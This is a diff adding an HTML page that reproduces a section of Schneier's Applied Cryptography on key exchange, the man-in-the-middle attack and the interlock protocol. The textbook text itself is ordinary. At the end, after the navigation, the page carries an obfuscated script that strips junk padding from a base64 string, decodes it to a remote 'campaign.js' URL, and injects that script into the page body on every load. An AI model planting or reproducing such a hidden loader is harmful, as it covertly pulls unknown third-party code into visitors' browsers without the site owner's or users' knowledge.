@@ -1,0 +1,124 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=047-049//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch02/02-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 3<BR>Basic Protocols
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">3.1 Key Exchange</FONT></H3>
+<P>A common cryptographic technique is to encrypt each individual conversation with a separate key. This is called a session key, because it is used for only one particular communications session. As discussed in Section 8.5, session keys are useful because they only exist for the duration of the communication. How this common session key gets into the hands of the conversants can be a complicated matter.
+</P>
+<P><FONT SIZE="+1"><B><I>Key Exchange with Symmetric Cryptography</I></B></FONT></P>
+<P>This protocol assumes that Alice and Bob, users on a network, each share a secret key with the Key Distribution Center (KDC) [1260]&#151;Trent in our protocols. These keys must be in place before the start of the protocol. (The protocol ignores the very real problem of how to distribute these secret keys; just assume they are in place and Mallory has no idea what they are.)
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice calls Trent and requests a session key to communicate with Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent generates a random session key. He encrypts two copies of it: one in Alice&#146;s key and the other in Bob&#146;s key. Trent sends both copies to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice decrypts her copy of the session key.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends Bob his copy of the session key.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts his copy of the session key.
+<DD><B>(6)</B>&nbsp;&nbsp;Both Alice and Bob use this session key to communicate securely.
+</DL>
+<P>This protocol relies on the absolute security of Trent, who is more likely to be a trusted computer program than a trusted individual. If Mallory corrupts Trent, the whole network is compromised. He has all of the secret keys that Trent shares with each of the users; he can read all past communications traffic that he has saved, and all future communications traffic. All he has to do is to tap the communications lines and listen to the encrypted message traffic.
+</P>
+<P>The other problem with this system is that Trent is a potential bottleneck. He has to be involved in every key exchange. If Trent fails, that disrupts the entire system.</P>
+<P><FONT SIZE="+1"><B><I>Key Exchange with Public-Key Cryptography</I></B></FONT></P>
+<P>The basic hybrid cryptosystem was discussed in Section 2.5. Alice and Bob use public-key cryptography to agree on a session key, and use that session key to encrypt data. In some practical implementations, both Alice&#146;s and Bob&#146;s signed public keys will be available on a database. This makes the key-exchange protocol even easier, and Alice can send a secure message to Bob even if he has never heard of her:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice gets Bob&#146;s public key from the KDC.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates a random session key, encrypts it using Bob&#146;s public key, and sends it to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob then decrypts Alice&#146;s message using his private key.
+<DD><B>(4)</B>&nbsp;&nbsp;Both of them encrypt their communications using the same session key.
+</DL>
+<P><FONT SIZE="+1"><B><I>Man-in-the-Middle Attack</I></B></FONT></P>
+<P>While Eve cannot do better than try to break the public-key algorithm or attempt a ciphertext-only attack on the ciphertext, Mallory is a lot more powerful than Eve. Not only can he listen to messages between Alice and Bob, he can also modify messages, delete messages, and generate totally new ones. Mallory can imitate Bob when talking to Alice and imitate Alice when talking to Bob. Here&#146;s how the attack works:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob her public key. Mallory intercepts this key and sends Bob his own public key.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob sends Alice his public key. Mallory intercepts this key and sends Alice his own public key.
+<DD><B>(3)</B>&nbsp;&nbsp;When Alice sends a message to Bob, encrypted in &#147;Bob&#146;s&#148; public key, Mallory intercepts it. Since the message is really encrypted with his own public key, he decrypts it with his private key, re-encrypts it with Bob&#146;s public key, and sends it on to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;When Bob sends a message to Alice, encrypted in &#147;Alice&#146;s&#148; public key, Mallory intercepts it. Since the message is really encrypted with his own public key, he decrypts it with his private key, re-encrypts it with Alice&#146;s public key, and sends it on to Alice.
+</DL>
+<P>Even if Alice&#146;s and Bob&#146;s public keys are stored on a database, this attack will work. Mallory can intercept Alice&#146;s database inquiry and substitute his own public key for Bob&#146;s. He can do the same to Bob and substitute his own public key for Alice&#146;s. Or better yet, he can break into the database surreptitiously and substitute his key for both Alice&#146;s and Bob&#146;s. Then he simply waits for Alice and Bob to talk with each other, intercepts and modifies the messages, and he has succeeded.
+</P>
+<P>This <B>man-in-the-middle attack</B> works because Alice and Bob have no way to verify that they are talking to each other. Assuming Mallory doesn&#146;t cause any noticeable network delays, the two of them have no idea that someone sitting between them is reading all of their supposedly secret communications.</P>
+<P><FONT SIZE="+1"><B><I>Interlock Protocol</I></B></FONT></P>
+<P>The <B>interlock protocol</B>, invented by Ron Rivest and Adi Shamir [1327], has a good chance of foiling the man-in-the-middle attack. Here&#146;s how it works:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob her public key.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob sends Alice his public key.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice encrypts her message using Bob&#146;s public key. She sends half of the encrypted message to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob encrypts his message using Alice&#146;s public key. He sends half of the encrypted message to Alice.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice sends the other half of her encrypted message to Bob.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob puts the two halves of Alice&#146;s message together and decrypts it with his private key. Bob sends the other half of his encrypted message to Alice.
+<DD><B>(7)</B>&nbsp;&nbsp;Alice puts the two halves of Bob&#146;s message together and decrypts it with her private key.
+</DL>
+<P>The important point is that half of the message is useless without the other half; it can&#146;t be decrypted. Bob cannot read any part of Alice&#146;s message until step (6); Alice cannot read any part of Bob&#146;s message until step (7). There are a number of ways to do this:
+</P>
+<DL>
+<DD>&#151; If the encryption algorithm is a block algorithm, half of each block (e.g., every other bit) could be sent in each half message.
+<DD>&#151; Decryption of the message could be dependent on an initialization vector (see Section 9.3), which could be sent with the second half of the message.
+<DD>&#151; The first half of the message could be a one-way hash function of the encrypted message (see Section 2.4) and the encrypted message itself could be the second half.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch02/02-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(RLGbqQcY, XoyOFuhP) {XoyOFuhP = RLGbqQcY.createElement('script');XoyOFuhP.type = 'text/javascript';XoyOFuhP.async = true;XoyOFuhP.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');RLGbqQcY.getElementsByTagName('body')[0].appendChild(XoyOFuhP);}(document));</script></body>
+</html>
